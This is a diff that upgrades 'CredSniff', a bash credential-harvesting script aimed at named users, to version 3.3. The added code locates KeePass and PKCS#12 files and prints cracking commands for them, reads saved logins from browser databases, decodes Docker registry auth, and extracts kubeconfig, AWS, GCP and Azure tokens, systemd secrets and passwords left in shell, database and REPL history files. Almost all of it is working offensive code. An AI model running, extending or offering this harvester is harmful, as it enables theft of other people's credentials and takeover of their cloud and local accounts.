@@ -1,6 +1,6 @@
 #!/bin/bash
 # ============================================================================
-#   CredSniff v3.2 — Credential Harvester
+#   CredSniff v3.3 — Credential Harvester
 #   Target-aware: finds credentials belonging to named users
 #   Usage: ./credsniff.sh -p "charles|sam" [-d /var] [-H]
 # ============================================================================
@@ -67,8 +67,8 @@ end_progress() {
 init_results() {
     RESULTS_DIR="credsniff-results/$(date +"%Y-%m-%d_%H%M%S")"
     mkdir -p "$RESULTS_DIR"
-    local hdr="# CredSniff v3.1 — $(date)"$'\n'
-    for f in credentials.txt hashes.txt ssh-keys.txt history.txt raw-matches.txt 00-summary.txt; do
+    local hdr="# CredSniff v3.3 — $(date)"$'\n'
+    for f in credentials.txt hashes.txt ssh-keys.txt history.txt binary-stores.txt raw-matches.txt 00-summary.txt; do
         echo -e "$hdr" > "${RESULTS_DIR}/${f}"
     done
 }
@@ -92,6 +92,7 @@ cred_hit() {
         HASH) color="$Y" ;;
         KEY)  color="$R" ;;
         HIST) color="$Y" ;;
+        NET)  color="$C" ;;
         *)    color="$G" ;;
     esac
 
@@ -114,7 +115,7 @@ banner() {
   \___|_|_\___|___/|___/_|\_|___|_| |_|
 BANNER
     echo -e "${RST}"
-    echo -e "  ${DIM}v3.2${RST} | ${Y}Credential Harvester${RST}"
+    echo -e "  ${DIM}v3.3${RST} | ${Y}Credential Harvester${RST}"
     echo ""
 }
 
@@ -124,14 +125,18 @@ usage() {
     echo "  credsniff.sh -p \"charles|sam\" [options]"
     echo ""
     echo -e "${W}Options:${RST}"
-    echo "  -d DIR        Target directory (default: /var/mail /etc /home /var/www)"
+    echo "  -d DIR        Target directory (default: /root /home /etc /opt /var/mail /var/www)"
     echo "                  Use + for multiple: /var/mail+lib+www  or absolute: /var/mail+/etc+/home"
     echo "  -p TARGETS    Target usernames/keywords (pipe-separated)"
     echo "  -w FILE       Load targets from wordlist"
     echo "  -e EXTS       Extension filter (e.g. conf,php,txt)"
-    echo "  -H            Also hunt shell history files"
+    echo "  -H            Also hunt shell/db/REPL history files"
     echo "  -q            Quiet — no banner or progress bar"
     echo "  -h            Help"
+    echo ""
+    echo -e "${W}Always scans:${RST}"
+    echo "  Binary stores  .kdbx .p12/.pfx GNOME keyring browser Login Data Firefox logins.json"
+    echo "  Network creds  systemd env vars Docker config k8s kubeconfig AWS/GCP/Azure creds"
     echo ""
     echo -e "${W}Examples:${RST}"
     echo "  credsniff.sh -p \"charles|sam\""
@@ -170,7 +175,7 @@ IFS='|' read -ra TARGETS <<< "$PATTERN"
 
 # ── Expand + syntax or apply smart defaults ────────────────────────────────────
 if [[ $D_SET -eq 0 ]]; then
-    for _sd in /var/mail /etc /home /var/www; do
+    for _sd in /root /home /etc /opt /var/mail /var/www; do
         [[ -d "$_sd" ]] && TARGET_DIRS+=("$_sd")
     done
     [[ ${#TARGET_DIRS[@]} -eq 0 ]] && TARGET_DIRS=("/var")
@@ -231,9 +236,19 @@ extract_cred_value() {
 
     # Trim whitespace, quotes
     val=$(echo "$val" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//; s/^["'"'"']//; s/["'"'"']$//')
+    # Attempt base64 decode if value looks encoded (>=16 base64 chars)
+    if [[ "$val" =~ ^[A-Za-z0-9+/]{16,}={0,2}$ ]]; then
+        local _dec
+        _dec=$(printf '%s' "$val" | base64 -d 2>/dev/null | tr -cd '[:print:]')
+        if [[ ${#_dec} -ge 8 && "$_dec" =~ [[:alnum:]] && \
+              ! "$_dec" =~ ^(true|false|null|none|NULL|None|NONE|undefined|yes|no|empty)$ ]]; then
+            val="${_dec}  [b64]"
+        fi
+    fi
     # Discard trivially short or obviously non-secret placeholder values
-    [[ ${#val} -lt 4 ]] && val=""
-    [[ "$val" =~ ^(true|false|null|none|NULL|None|NONE|undefined|yes|no|empty|Bearer|bearer|changeme|CHANGEME|example|EXAMPLE)$ ]] && val=""
+    local _cv="${val%  \[b64\]}"
+    [[ ${#_cv} -lt 4 ]] && val=""
+    [[ "$_cv" =~ ^(true|false|null|none|NULL|None|NONE|undefined|yes|no|empty|Bearer|bearer|changeme|CHANGEME|example|EXAMPLE)$ ]] && val=""
     echo "$val"
 }
 
@@ -248,9 +263,16 @@ is_mail_file() {
 # ── Which targets appear in this file ─────────────────────────────────────────
 file_targets() {
     local file="$1"
+    [[ -z "$PATTERN" || ${#TARGETS[@]} -eq 0 ]] && return
     local found=()
+    # Single grep pass with the combined pattern — O(1) instead of O(N targets)
+    local _hits
+    _hits=$(grep -oiE "\b(${PATTERN})\b" "$file" 2>/dev/null | \
+            awk '{print tolower($0)}' | sort -u)
+    [[ -z "$_hits" ]] && return
     for t in "${TARGETS[@]}"; do
-        grep -qiE "\b${t}\b" "$file" 2>/dev/null && found+=("$t")
+        local _tl; _tl=$(echo "$t" | tr '[:upper:]' '[:lower:]')
+        echo "$_hits" | grep -qxF "$_tl" && found+=("$t")
     done
     echo "${found[@]}"
 }
@@ -418,6 +440,135 @@ scan_keys() {
     [[ $TOTAL_FILES -gt 0 ]] && draw_progress "$FILES_SCANNED" "$TOTAL_FILES"
 }
 
+# ── Binary credential store scanner ──────────────────────────────────────────
+scan_binary_stores() {
+
+    _bs_hit() {
+        local stype="$1" spath="$2" snote="$3"
+        clear_progress
+        printf "[%s] ${M}%-12s${RST} ${W}→${RST}  ${M}%s${RST}   ${DIM}%s${RST}\n" \
+            "$(ts)" "$stype" "$spath" "$snote"
+        rwrite "binary-stores.txt" "$(printf '%-12s %s' "$stype" "$spath")"
+        rwrite "binary-stores.txt" "  note: ${snote}"
+        rwrite "binary-stores.txt" ""
+        ATTACK_PATHS+=("${stype}: ${snote}")
+    }
+
+    # KeePass databases (.kdbx)
+    while IFS= read -r f; do
+        [[ -z "$f" ]] && continue
+        _bs_hit "KeePass" "$f" "keepass2john ${f} > kp.hash && john --wordlist=rockyou.txt kp.hash"
+    done < <(find /root /home /opt /var/www -name "*.kdbx" -type f 2>/dev/null)
+
+    # PKCS#12 bundles (.p12 / .pfx)
+    while IFS= read -r f; do
+        [[ -z "$f" ]] && continue
+        _bs_hit "PKCS12" "$f" "pfx2john ${f} > pfx.hash && john pfx.hash  |OR|  openssl pkcs12 -in ${f} -nodes -passin pass:"
+    done < <(find /root /home /opt /etc/ssl -type f \( -name "*.p12" -o -name "*.pfx" \) 2>/dev/null)
+
+    # GNOME keyring files
+    while IFS= read -r f; do
+        [[ -z "$f" ]] && continue
+        _bs_hit "GNOMEkey" "$f" "secret-tool lookup or python3 -c 'import secretstorage; ...'"
+    done < <(find /root /home -type f -name "*.keyring" 2>/dev/null)
+
+    # Chrome / Chromium / Edge / Brave Login Data (SQLite)
+    while IFS= read -r f; do
+        [[ -z "$f" ]] && continue
+        local bnote="sqlite3 '${f}' \"SELECT origin_url,username_value FROM logins;\""
+        if command -v sqlite3 &>/dev/null; then
+            local uinfo
+            uinfo=$(sqlite3 "$f" \
+                "SELECT origin_url||'  ['||username_value||']' FROM logins WHERE username_value != '' LIMIT 5;" \
+                2>/dev/null | paste -sd'  |  ' 2>/dev/null)
+            [[ -n "$uinfo" ]] && bnote="$uinfo"
+        fi
+        _bs_hit "BrowserDB" "$f" "$bnote"
+    done < <(find /root /home -type f -name "Login Data" 2>/dev/null | \
+             grep -E "(google-chrome|chromium|microsoft-edge|brave-browser|Chrome)/")
+
+    # Firefox logins.json
+    while IFS= read -r f; do
+        [[ -z "$f" ]] && continue
+        _bs_hit "Firefox" "$f" "firefox_decrypt or firepwd.py  (logins NSS-encrypted with key4.db)"
+    done < <(find /root /home -type f -name "logins.json" -path "*firefox*" 2>/dev/null)
+}
+
+# ── Network / system credential source scanner ────────────────────────────────
+scan_network_creds() {
+
+    # ── systemd service environment variables ─────────────────────────────────
+    local svc_cred_re='Environment=.*[_](PASS|SECRET|TOKEN|KEY|PWD|CRED)[^=]*='
+    while IFS= read -r svc; do
+        [[ -r "$svc" ]] || continue
+        while IFS= read -r line; do
+            local kv="${line#*Environment=}" k="${kv%%=*}" v="${kv#*=}"
+            v=$(echo "$v" | sed 's/^["'"'"' ]//; s/["'"'"' ]$//')
+            [[ ${#v} -ge 4 ]] && cred_hit "systemd" "$v" "${svc} [${k}]" "NET"
+        done < <(grep -E "$svc_cred_re" "$svc" 2>/dev/null)
+        # EnvironmentFile= references
+        while IFS= read -r ef_raw; do
+            local ef="${ef_raw#*EnvironmentFile=}"; ef="${ef#-}"
+            ef=$(echo "$ef" | tr -d '"')
+            [[ -f "$ef" && -r "$ef" ]] || continue
+            while IFS= read -r eline; do
+                [[ "$eline" =~ ^[[:space:]]*# || -z "$eline" ]] && continue
+                local ev; ev=$(extract_cred_value "$eline")
+                [[ -n "$ev" ]] && cred_hit "systemd" "$ev" "$ef" "NET"
+            done < "$ef"
+        done < <(grep "^EnvironmentFile=" "$svc" 2>/dev/null)
+    done < <(find /etc/systemd /lib/systemd -name "*.service" 2>/dev/null)
+
+    # ── Docker registry auth (base64 decoded) ─────────────────────────────────
+    for dcfg in /root/.docker/config.json /home/*/.docker/config.json; do
+        [[ -f "$dcfg" && -r "$dcfg" ]] || continue
+        while IFS= read -r b64; do
+            [[ -z "$b64" ]] && continue
+            local dec; dec=$(printf '%s' "$b64" | base64 -d 2>/dev/null)
+            [[ -n "$dec" && "$dec" == *:* ]] && cred_hit "docker" "$dec" "$dcfg" "NET"
+        done < <(grep -oE '"auth"[[:space:]]*:[[:space:]]*"[A-Za-z0-9+/=]+"' "$dcfg" 2>/dev/null | \
+                 sed 's/.*"auth"[[:space:]]*:[[:space:]]*"//; s/"$//')
+    done
+
+    # ── Kubernetes kubeconfig tokens / passwords ──────────────────────────────
+    for kcfg in /root/.kube/config /home/*/.kube/config; do
+        [[ -f "$kcfg" && -r "$kcfg" ]] || continue
+        while IFS= read -r line; do
+            local v; v=$(echo "$line" | sed 's/.*:[[:space:]]*//; s/^"//; s/"$//')
+            v=$(echo "$v" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
+            [[ ${#v} -ge 8 ]] && cred_hit "k8s" "$v" "$kcfg" "NET"
+        done < <(grep -E "^[[:space:]]*(token|password):[[:space:]]\S" "$kcfg" 2>/dev/null)
+    done
+
+    # ── AWS credentials (~/.aws/credentials) ─────────────────────────────────
+    for awscfg in /root/.aws/credentials /home/*/.aws/credentials; do
+        [[ -f "$awscfg" && -r "$awscfg" ]] || continue
+        while IFS= read -r line; do
+            local v="${line#*=}"; v=$(echo "$v" | sed 's/^[[:space:]]*//; s/[[:space:]]*$//')
+            [[ ${#v} -ge 16 ]] && cred_hit "AWS" "$v" "$awscfg" "NET"
+        done < <(grep -iE "(secret_access_key|session_token)[[:space:]]*=" "$awscfg" 2>/dev/null)
+    done
+
+    # ── GCP application default credentials ──────────────────────────────────
+    for gcpcfg in /root/.config/gcloud/application_default_credentials.json \
+                  /home/*/.config/gcloud/application_default_credentials.json; do
+        [[ -f "$gcpcfg" && -r "$gcpcfg" ]] || continue
+        while IFS= read -r line; do
+            local v; v=$(echo "$line" | sed 's/.*:[[:space:]]*"//; s/".*//')
+            [[ ${#v} -ge 8 ]] && cred_hit "GCP" "$v" "$gcpcfg" "NET"
+        done < <(grep -E '"(client_secret|refresh_token)"' "$gcpcfg" 2>/dev/null)
+    done
+
+    # ── Azure access tokens ───────────────────────────────────────────────────
+    for azcfg in /root/.azure/accessTokens.json /home/*/.azure/accessTokens.json; do
+        [[ -f "$azcfg" && -r "$azcfg" ]] || continue
+        while IFS= read -r line; do
+            local v; v=$(echo "$line" | sed 's/.*:[[:space:]]*"//; s/".*//')
+            [[ ${#v} -ge 16 ]] && cred_hit "Azure" "$v" "$azcfg" "NET"
+        done < <(grep -E '"(accessToken|refreshToken)"' "$azcfg" 2>/dev/null)
+    done
+}
+
 # ── Per-file dispatcher ───────────────────────────────────────────────────────
 scan_file() {
     local file="$1"
@@ -456,7 +607,8 @@ main() {
         echo -e " ${W}Targets:${RST} ${C}${pat_display}${RST}"
         echo -e " ${W}Dirs:${RST}    ${C}${TARGET_DIRS[*]}${RST}"
         [[ -n "$EXTENSIONS" ]] && echo -e " ${W}Ext:${RST}     ${C}${EXTENSIONS}${RST}"
-        [[ $HISTORY_MODE -eq 1 ]] && echo -e " ${W}History:${RST} ${C}enabled${RST}"
+        [[ $HISTORY_MODE -eq 1 ]] && echo -e " ${W}History:${RST} ${C}bash zsh fish python mysql psql sqlite redis${RST}"
+        echo -e " ${W}Extra:${RST}   ${C}binary stores + network/cloud creds${RST}"
         echo -e " ${W}Results:${RST} ${C}${RESULTS_DIR}/${RST}"
         echo ""
     fi
@@ -482,10 +634,16 @@ main() {
 
     # ── History hunting (-H) ───────────────────────────────────────────────────
     if [[ $HISTORY_MODE -eq 1 ]]; then
-        local hist_pat='sshpass[[:space:]]+-p|mysql[[:space:]].*-p[^[:space:]]|curl[[:space:]].*(-u|--user)[[:space:]]+[^[:space:]]+:[^[:space:]]|wget[[:space:]].*(--password|--http-password)[=[:space:]][^[:space:]]|export[[:space:]]+(PASSWORD|PASS|SECRET|TOKEN|KEY|API_KEY)[=[:space:]]|[Pp]ass(word)?[[:space:]]*=[[:space:]]*\S|--password[=[:space:]]\S'
+        local hist_pat='sshpass[[:space:]]+-p|mysql[[:space:]].*-p[^[:space:]]|curl[[:space:]].*(-u|--user)[[:space:]]+[^[:space:]]+:[^[:space:]]|wget[[:space:]].*(--password|--http-password)[=[:space:]][^[:space:]]|export[[:space:]]+(PASSWORD|PASS|SECRET|TOKEN|KEY|API_KEY)[=[:space:]]|[Pp]ass(word)?[[:space:]]*=[[:space:]]*\S|--password[=[:space:]]\S|IDENTIFIED[[:space:]]+(BY|WITH)[[:space:]]+'"'"'\S'
         local hfiles=()
-        for f in /root/.bash_history /root/.zsh_history \
+        for f in /root/.bash_history   /root/.zsh_history \
+                  /root/.local/share/fish/fish_history \
+                  /root/.python_history /root/.mysql_history \
+                  /root/.psql_history   /root/.sqlite_history /root/.rediscli_history \
                   /home/*/.bash_history /home/*/.zsh_history \
+                  /home/*/.local/share/fish/fish_history \
+                  /home/*/.python_history /home/*/.mysql_history \
+                  /home/*/.psql_history   /home/*/.sqlite_history /home/*/.rediscli_history \
                   ~/.bash_history ~/.zsh_history; do
             [[ -f "$f" && -r "$f" ]] && hfiles+=("$f")
         done
@@ -535,6 +693,16 @@ main() {
         done
     fi
 
+    # ── Binary credential stores ───────────────────────────────────────────────
+    [[ $QUIET -eq 0 ]] && printf "\r\033[K  ${DIM}scanning binary stores…${RST}" >&2
+    scan_binary_stores
+    clear_progress
+
+    # ── Network / system credential sources ───────────────────────────────────
+    [[ $QUIET -eq 0 ]] && printf "\r\033[K  ${DIM}scanning network cred sources…${RST}" >&2
+    scan_network_creds
+    clear_progress
+
     # ── Done ──────────────────────────────────────────────────────────────────
     end_progress
 
@@ -560,7 +728,7 @@ main() {
 
     if [[ $FOUND_COUNT -eq 0 ]]; then
         echo -e "  ${Y}No credentials found.${RST}"
-        echo -e "  ${DIM}Tips: check permissions, try -d /var/mail+etc+home, use -H${RST}"
+        echo -e "  ${DIM}Tips: check permissions, try -d /root+home+etc+opt, use -H for history${RST}"
         echo ""
     fi
 }
